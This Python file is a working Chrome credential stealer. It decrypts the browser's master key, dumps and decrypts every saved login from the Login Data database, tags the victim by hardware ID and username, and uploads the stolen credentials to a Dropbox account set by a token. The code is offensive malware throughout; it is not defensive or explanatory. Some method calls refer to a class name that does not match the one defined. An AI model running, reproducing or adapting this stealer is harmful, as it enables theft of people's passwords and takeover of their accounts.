import os
import subprocess
import dropbox
from time import time
import json
import base64
import sqlite3
import win32crypt
import shutil
from Crypto.Cipher import AES

class DropboxChromeLoginHarvester:

    r""" 
    opens the file "<username>\AppData\Local\Google\Chrome\User Data\Local State 
    goes into its 'os_crypt' key, containing 'encrypted_key'
    decrypts the master key that Google uses to hash creds
    """
    @staticmethod
    def get_master_key():
        with open(
            os.environ['USERPROFILE']  # the same as os.getlogin()
            + os.sep  # path separator for the OS, windows "\\"
            + r'AppData\Local\Google\Chrome\User Data\Local State', 
        'r') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        # `Local State.json` file stores a key "os_crypt" 
        # containing another key "encrypted_key"
        # that stores a BASE64 ENCODED MASTER KEY
        # which is used to HASH THE CREDENTIALS
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]  # bytes 5 onward are the master key
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def generate_cipher(aes_key, initialization_vector):
        return AES.new(aes_key, AES.MODE_GCM, initialization_vector)

    @staticmethod
    def decrypt_payload(cipher, payload):
    # cipher: AES (object)
        return cipher.decrypt(payload)

    @staticmethod
    def decrypt_password_pre_v80(hashed_password): 
        return win32crypt.CryptUnprotectData(hashed_password)		

    @staticmethod
    def decrypt_password(password_value_buffer, master_key):
        # password_value is stored as a BLOB in the db
        try:
            initialization_vector = password_value_buffer[3:15]  # 4th to 15th bytes
            payload = password_value_buffer[15:]  # 16th byte and onward
            cipher = ChromeLoginHarvester.generate_cipher(master_key, initialization_vector)
            # remove the 16 suffix bytes
            # from the end of the decrypted password
            decrypted_password = \
                ChromeLoginHarvester.decrypt_payload(cipher, payload)[:-16].decode()
            return decrypted_password
        except Exception as e:
            # most prob was stored by an older version of chrome < 80
            old_decrypted = ChromeLoginHarvester.decrypt_password_pre_v80(password_value_buffer)
            return old_decrypted

    def __init__(self, config) -> None:
        # change output_json_filepath to output_dropbox_dirpath, and make filename ms timestamp + '.txt'
        self.config = config
        self._victim_hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].split(' ')[0]
        self._victim_username = os.getlogin()
        substr_replacements: dict = {
            '`hwid`': self._victim_hwid,
            '`victim_username`': self._victim_username
        }
        # replace special substrs in config
        for key in self.config.keys():
            if type(self.config[key]) is not str:
                continue
            for old_substr, new_substr in substr_replacements.items():
                self.config[key] = self.config[key].replace(old_substr, new_substr)

    def run(self):
        master_key = self.get_master_key()
        login_db = \
            os.environ['USERPROFILE'] \
            + os.sep \
            + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
        # make a temp. copy of the login creds db
        # so that it can be accessed even when Chrome is running.
        # (it cannot if chrome is running, resource lock)
        shutil.copy2(login_db, self.config['copy_db_filepath'])
        conn = sqlite3.connect(self.config['copy_db_filepath'])
        cur = conn.cursor()
        cur.execute('SELECT action_url, username_value, password_value FROM logins')
        creds = []
        for r in cur.fetchall():
            try:
                url = r[0]
                username = r[1]
                # skip blank usernames
                if len(username) == 0:
                    continue
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, master_key)
                creds.append([url, username, decrypted_password])
            except Exception as e:
                continue
        content = json.dumps(creds, indent=self.config['output_json_indent_level'])
        output_filename = str(round(time() * 1000)) + '.json'
        dropbox_filepath = (self.config['output_dropbox_dirpath'] + '/' + output_filename).replace('//', '/')
        dbx = dropbox.Dropbox(self.config['dropbox_token'])
        dbx.files_upload(content.encode('utf-8'), dropbox_filepath)
        cur.close()
        conn.close()
        os.remove(self.config['copy_db_filepath'])